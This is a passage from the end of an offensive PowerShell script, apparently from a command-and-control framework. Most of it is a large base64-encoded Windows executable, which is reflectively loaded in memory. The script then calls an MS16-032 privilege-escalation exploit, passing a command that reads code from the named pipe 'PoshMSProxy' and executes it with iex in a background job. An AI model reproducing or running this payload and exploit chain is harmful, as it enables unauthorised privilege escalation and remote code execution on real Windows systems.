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yKjM1M1AzVzNcM2AzZDOFM68z4TPoM+wz8DP0M/gz/DMANAQ0TjRUNFg0XDRgNMc1hDaJNo42pTbuNvU2/TZtN3I3ezeHN4w3tTfAN8s3eTh/OKE48jj6OAM5DDkuOXI5ejmNOZg5nTmtObk5vjnJOdM56TkKOqo6wTrOOto66jrwOgE7IDs2O0A7RjtRO3Q7eTuFO4o7qTsYPCY8MDw+PFc8YjxoPHo8hDyNPNU82jzkPB49Iz0qPTA9lD3jPQs+GT7FP+M//D8AQAAAKAEAAAMwCzAQMBQwGDBBMGcwhTCMMJAwlDCYMJwwoDCkMKgw8jD4MPwwADEEMWoxdTGQMZcxnDGgMaQxxTHvMSEyKDIsMjAyNDI4MjwyQDJEMo4ylDKYMpwyoDKnNPI0FjULNis2fDaUNpk2BzgYODg5PjlCOUc5TTlROVc5WzlhOWU5ajlwOXQ5ejl+OYQ5iDmOOZI5pjnEOeY5/DlAOr86yTrQOuM6GzshOyc7LTszOzk7QDtHO047VTtcO2M7ajtyO3o7gjuOO5c7nDuiO6w7tjvGO9Y75jvvOwE8DzwmPDE8YDzFPM481jzwPA89JD0uPUc9UT1ePWg9fz1hPqE+rD6yPg4/KD81P0Q/Tj9gP28/dj+HP5U/oD+oP7U/vz/lPwBQAABcAAAAFjAjMCwwUDB9MPMwAzEZMTgxgzGKMaAxqjHsMRQzKTNQM5M21jdROVc5fTmDOaU5qzlSO8Y9yj3OPdI91j3aPd494j3LPv8+Ez9DP1E/bj/IPwAAAGAAAGgAAABbMGMwejCYMNowaTFvMZQxqTHFMeYxJTI6MlgyAzMKMzAzNzOnM7wz4zMxNx44kjmYOb45xDnjOek5hDuuPbI9tj26Pb49wj3GPco9wT7TPuw+Iz85Pz8/UT+wP8I/AAAAcAAAhAEAAAIwDTAfMLUx0DHmMfwxBDJXNT82SjZaNow2/TYPNyE37zcQOBU4YDhlOIA4hTinOMQ4yjjUOOo4/TgTORw5KDkzOVo5izmjOdE51jn7ORA6FjogOiY6Njo+OkQ6UzpdOmM6cjp8OoI6lDqeOqQ6vzrPOtg64Dr4Ogs7ETsXOx47JzssOzI7Ojs/O0U7TTtSO1g7YDtlO2s7czt4O347hjuLO5E7mTueO6Q7rDuxO7c7vzvEO8o70jvXO9075TvqO/A7+Dv9OwM8CzwQPBY8HjwjPCk8MTw2PDs8RDxJPE88VzxcPGI8ajxvPHU8fTyCPIg8kDyVPJs8ozyoPK48tjy7PME8yTzOPNQ83DzhPOc87zz0PPo8Aj0HPQ09FT0aPSA9KD0tPTM9Oz1APUY9Tj1TPVk9YT1mPWs9dD15PX89hz2NPZs9qT23Pb49yz3UPfU9Hj4xPkE+gD6YPqI+vj7FPss+2T7fPvQ+BT8RPxg/Hz86P0Q/cj+FP9Q/AIAAANgAAABWMFswbTCLMJ8wpTBGMUwxUjFjMW4xdDGbMeAx5jHrMfUx+zEdMiUyKzI3MjwyQTJGMk8yojKnMuYy6zL0MvkyAjMHMxQzcTN7M5YzoDMPNEg0UDRhNIs0kjSZNKA0uDTHNNE03jToNPg0SzV9NZg1CDcfN1c3bDd6N4M3rjc1OF44eDiAOIs4oji8ONc43zjtOPI4ATkvOVo5kTnHOdo5ajqeOsU6EDtNO2w7gzuSOxI8fT39PSo+Yj5qPss+0T76PhU/LT85P0g/bT+vPwAAAJAAAIwAAAAAMAowLDBHMGAwcTB+MIUwlDDHMNww4jAaMSYxZjGFMbox1TEaMiAyJzJ8MrQyxzIYM1MzXjNlM2szcTPcM+EzhjXINdQ1HTYpNjM2QjZNNms2hzaPNpQ2wDbbNuc29jb/Ngw3OzdDN1Q3nTf/N5c4pDi1ONU4mzrZPPk+Bz8RP2k/AAAAoAAAHAAAAAkxlzHqMaczpDr7Oj47+Dy5PQAAALAAAGgAAADhMAQxJzGDMaQxqzHSMd8x5DHyMdMy+TIEMyYzeTP2Mwo0gTTXNJE1xDV4Nr421DYNN2832Df4Nyk4cji9OOs5ITolOzE7PDybPKE8rTzkPPw8SD1OPVo9eD5/Pq4/yj8AwAAAlAAAAE8weDChMK8wtTDxMJkxADKoMhwz2zPcNOw0/TQFNRU1JjXVNuQ2BzcYNx43Kjc6N0A3TzdWN2Y3bDdyN3o3gDeGN443lDeaN6I3qzeyN7o3wzfVN+038zf8NwI4DDgXOFo4cjiLOMM4KDmoOZc6DDtJO8o73DtMPLE8vTw1PU89WD3dPeg9Sz+GPwAAANAAAEwAAABuMRIygDOjNho3SjdnN4U3mjekNwM4OjhUOHo4/ThxOfE5Lzo4OlY6yDqVO8Q7zTsjPCw8CT0UPSc9Oz39PQY+Ej8bPwDgAABoAAAABzBRMFowgjDcMBMxaDF6MYwxnjGwMcIx1DHmMfgxCjIcMi4yQDJfMnEygzKVMqcyLTc0N5w32Df1NxQ4zjjYOPM4DTmYOVg6OTtDO0k7XTtpO487BjwoPTA92D5qP3Y/APAAAFwAAAAEMAwwGDAnMLMwyjABMXgxmjKiMko03DToNHY1fjWKNZk1JTY8NnY2/jZeOnA65D3oPew98D30Pfg9/D0APgQ+CD4MPhA+Hj7cPvU+BD8lP10/uj8AAAEAPAAAAPY5LTxkPHo8oDwaPVc9YT2APdI97j04PkQ+az6BPpQ+tj69Pgk/HT9hP2o/dT+EP6M/AAAAEAEAMAAAAMwx3THxMfcx/DFSMlgymDLCMuIyAjMiMz0zUjNWM2IzZjNyM3YzAAAAIAEApAEAACwxMDE0MUAxRDFIMUwxUDFcMWAxZDFMNlQ2XDZkNmw2dDZ8NoQ2jDaUNpw2pDasNrQ2vDbENsw21DbcNuQ27Db0Nvw2BDcMNxQ3HDckNyw3NDc8N0Q3TDdUN1w3ZDdsN3Q3fDeEN4w3lDecN6Q3rDe0N7w3xDfMN9Q33DfkN+w39Df8NwQ4DDgUOBw4JDgsODQ4PDhEOEw4VDhcOGQ4bDh0OHw4hDiMOJQ4pDisOLQ4vDjEOMw41DjcOOQ47Dj0OPw4BDkMORQ5HDkkOSw5NDk8OUQ5TDlUOVw5ZDlsOXQ5fDmEOYw5lDmcOaQ5rDm0Obw5xDnMOdQ53DnkOew59Dn8OQQ6DDoUOhw6JDosOjQ6PDpEOkw6VDpcOmQ6bDp0Onw6hDqMOpQ6nDqkOqw6tDq8OsQ6zDrUOtw65DrsOvQ6/DoEOww7FD8YPxw/ID8kPyg/LD8wPzQ/OD88P0A/RD9IP0w/UD9UP1g/XD9gP2Q/aD9sP3A/dD94P3w/gD+EP4g/jD+gP6Q/qD+sP7A/tD+4P7w/wD/EP8g/AAAAMAEAVAAAABQwGDAcMCAwODA8MGQ0bDR0NHw0hDSMNJQ0nDSkNKw0tDS8NMQ0zDTUNNw05DTsNPQ0/DQENQw1FDXEPsg+zD7QPqg/rD+wP7Q/AAAAQAEAJAMAAJQznDOkM6wztDO8M8QzzDPUM9wz5DPsM/Qz/DMENAw0FDQcNCQ0LDQ0NDw0RDRMNFQ0XDRkNGw0dDR8NIQ0jDSUNJw0pDSsNLQ0vDTENMw01DTcNOQ07DT0NPw0BDUMNRQ1HDUkNSw1NDU8NUQ1TDVUNVw1ZDVsNXQ1fDWENYw1lDWcNaQ1rDW0Nbw1xDXMNdQ13DXkNew19DX8NQQ2DDYUNhw2JDYsNjQ2PDZENkw2VDZcNmQ2bDZ0Nnw2hDaMNpQ2nDakNqw2tDa8NsQ2zDbUNtw25DbsNvQ2/DYENww3FDccNyQ3LDc0Nzw3RDdMN1Q3XDdkN2w3dDd8N4Q3jDeUN5w3pDesN7Q3vDfEN8w31DfcN+Q37Df0N/w3BDgMOBQ4HDgkOCw4NDg8OEQ4TDhUOFw4ZDhsOHQ4fDiEOIw4lDicOKQ4rDi0OLw4xDjMONQ43DjkOOw49Dj8OAQ5DDkUORw5JDksOTQ5PDlEOUw5VDlcOWQ5bDl0OXw5hDmMOZQ5nDmkOaw5tDm8OcQ5zDnUOdw55DnsOfQ5/DkEOgw6FDocOiQ6LDo0Ojw6RDpMOlQ6XDpkOmw6dDp8OoQ6jDqUOpw6pDqsOrA6uDrAOsg60DrYOuA66DrwOvg6ADsIOxA7GDsgOyg7MDs4O0A7SDtQO1g7YDtoO3A7eDuAO4g7kDuYO6A7qDuwO7g7wDvIO9A72DvgO+g78Dv4OwA8CDwQPBg8IDwoPDA8ODxAPEg8UDxYPGA8aDxwPHg8gDyIPJA8mDygPKg8sDy4PMA8yDzQPNg84DzoPPA8+DwAPQg9ED0YPSA9KD0wPTg9QD1IPVA9WD1gPWg9cD14PYA9iD2QPZg9oD2oPbA9uD3APcg90D3YPeA96D3wPfg9AD4IPhA+GD4gPig+MD44PkA+SD5QPlg+YD5oPnA+eD6APog+kD6YPqA+qD6wPrg+wD7IPtA+2D7gPug+8D74PgA/CD8QPxg/ID8oPzA/OD9AP0g/UD9YP2A/aD9wP3g/gD+IP5A/mD+gP6g/sD+4P8A/yD/QP9g/4D/oP/A/+D8AUAEAfAAAAAAwCDAQMBgwIDAoMDAwODBAMEgwUDBYMGAwaDBwMHgwgDCIMJAwmDCgMKgwsDC4MMAwyDDQMNgw4DDoMPAw+DAAMQgxEDEYMSAxKDEwMTgxQDFIMVAxWDFgMWgxcDF4MYAxiDGQMZgxoDGoMbAxuDHAMcgxAGABANAAAACINIw0kDSUNJg0nDSgNKQ0qDSsNLA0tDS4NLw0wDTENMg0zDTQNNQ02DTcNOA05DToNOw08DT0NPg0/DQANQQ1CDUMNRA1FDUYNRw1IDUkNSg1LDUwNTQ1ODU8NUA1RDVINUw1UDVUNVg1XDVgNWQ1aDVsNXA1dDV4NXw1gDWENYg1jDWQNZQ1mDWcNaA1pDWoNaw1sDW0Nbg1vDXANcQ1yDXMNdA11DXYNdw14DXkNeg17DXwNfQ1+DX8NQA2BDYINgw2EDYAAABwAQAMAQAApDioODA5SDlYOVw5cDl0OYQ5iDmMOZQ5rDm8OcA50DnUOdg54Dn4OQg6DDocOiA6JDooOjA6SDpYOlw6bDpwOnQ6eDqAOpg6qDqsOrw6wDrIOuA68Dr0OgQ7CDsYOxw7IDsoO0A7UDtUO2w7fDuAO4Q7iDucO6A7pDu8O8A72DvoO+w7/DsAPAQ8DDwkPDQ8RDxIPEw8UDxkPGg8bDxwPMg86DzwPPw8BD1IPVw9bD18PYg9kD3UPeg9+D0IPhQ+HD5QPmA+bD50Pqg+uD7APsg+0D7UPtw+8D74Pgw/FD8oPzA/OD9AP0Q/SD9QP2Q/bD90P3w/gD+EP4w/oD/AP+A/AAAAgAEAeAAAAAAwIDA8MEAwXDBgMIAwoDC8MMAw3DDgMPwwADEgMUAxYDGAMYwxqDG0MdAx8DH4MfwxGDIgMiQyPDJAMlwyYDJwMpQyoDKoMtQy2DLgMugy8DL0MvwyEDMwM1AzXDN4M5gzuDPYM/gzGDQ4NFg0AAAAkAEAUAEAABgwIDAQNBQ0VDRcNGQ0bDR0NHw0hDSMNJQ0nDSkNKw0tDS8NMQ0zDTUNNw05DTsNPQ0/DQENQw1FDUcNSQ1LDU0NYQ2iDaMNpA2lDaYNpw2oDakNqg23DooPCw8MDw0PDg8PDxAPEQ8SDxMPFA8VDxYPFw8YDxkPGg8bDxwPHQ8eDx8PIA8hDyIPIw8kDyUPJg8nDygPKQ8qDysPLA8tDy4PLw8wDzEPMg8zDzQPNw84DzkPOg87DzwPPQ8+Dz8PAA9BD0IPQw9ED0UPRg9HD0gPSQ9KD0sPTA9ND04PTw9QD1EPUg9TD1QPVQ9WD1cPWA9ZD1oPWw9cD10PXg9fD2APYQ9iD2MPbQ9xD3UPeQ99D0UPiA+JD4oPiw+cD54Pnw+gD6EPog+jD6QPpQ+mD6cPqg+rD6wPrQ+uD68PsA+xD7MPtA+4D4AoAEAJAAAAOgx7DHwMfQxEDIsMkwybDKMMqQyxDLwMhwzQDMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)

}

Main
}
invoke-ms16-032 "powershell -c `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
}

start-job -ScriptBlock $scriptblock 
